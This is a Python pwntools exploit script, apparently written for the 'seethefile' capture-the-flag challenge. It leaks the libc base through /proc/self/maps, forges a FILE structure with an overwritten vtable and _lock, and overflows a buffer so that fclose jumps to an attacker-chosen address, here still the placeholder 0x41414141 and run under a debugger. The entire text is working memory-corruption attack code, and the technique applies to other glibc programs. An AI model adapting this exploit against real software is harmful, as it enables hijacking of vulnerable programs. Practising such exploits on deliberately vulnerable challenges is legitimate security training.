from pwn import *

seethefile = ELF('seethefile')
libc = ELF('libc_32.so.6')


VTABLE_FCLOSE_OFFSET = 0x8
LOCK_OFFSET = 0x48
VTABLE_OFFSET = 0x94

MAGICBUF_ADDR = 0x0804B0C0
SHELLCODE_ADDR = 0x41414141
NULL_AREA_ADDR = MAGICBUF_ADDR + 0x48 + 4

VMMAP_FILE = '/proc/self/maps'


class Prompts:
    MENU = 'MENU'
    CHOICE = 'Your choice :'
    FILE_NAME = 'What do you want to see :'


class Choices:
    OPEN = '1'
    READ = '2'
    PRINT = '3'
    CLOSE = '4'
    EXIT = '5'


p = gdb.debug(
    seethefile.path,
    '''
    b fclose+229
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def leak_libc_addr():
    libc_base_addr = None
    p.sendlineafter(Prompts.CHOICE, Choices.OPEN)
    p.sendlineafter(Prompts.FILE_NAME, VMMAP_FILE)

    while not libc_base_addr:
        p.sendlineafter(Prompts.CHOICE, Choices.READ)
        p.sendlineafter(Prompts.CHOICE, Choices.PRINT)
        vmmap = p.recvuntil(Prompts.MENU).decode().splitlines()
        for mapping in vmmap:
            if mapping.endswith('libc_32.so.6'):
                libc_base_addr = f'0x{mapping[:8]}'
                break

    p.sendlineafter(Prompts.CHOICE, Choices.CLOSE)
    print(f'[*] libc base address: {libc_base_addr}')
    return int(libc_base_addr, 16)


leak_libc_addr()

p.sendline('1')
p.sendline('/proc/self/fd/0')
p.sendline('2')

payload = b''


# Override `fclose` handler.
payload += b'\0' * VTABLE_FCLOSE_OFFSET + p32(SHELLCODE_ADDR)

# Override `_lock`.
payload += b'\0' * (LOCK_OFFSET - VTABLE_FCLOSE_OFFSET -
                    4) + p32(NULL_AREA_ADDR)

# Override `vtable` member of the `FILE` struct.
payload += b'\0' * (VTABLE_OFFSET - LOCK_OFFSET - 4) + p32(MAGICBUF_ADDR)

# Fill buffer
payload += b'\0' * 500

p.sendline(payload)

p.sendline('5')
# Set `fp` to `magicbuf`
p.sendline(b'A' * 0x20 + p32(MAGICBUF_ADDR))
